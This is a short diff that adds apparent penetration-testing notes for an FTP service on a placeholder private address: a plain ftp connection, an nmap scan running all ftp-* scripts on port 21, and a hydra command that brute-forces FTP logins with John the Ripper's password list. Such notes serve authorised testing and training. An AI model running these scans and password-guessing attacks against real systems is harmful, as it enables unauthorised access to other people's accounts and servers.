@@ -1,0 +1,5 @@
+ftp 192.168.X.X
+
+nmap --script=ftp-* -p 21 192.168.X.X
+
+hydra -l $user -P /usr/share/john/password.lst ftp://192.168.X.X:21
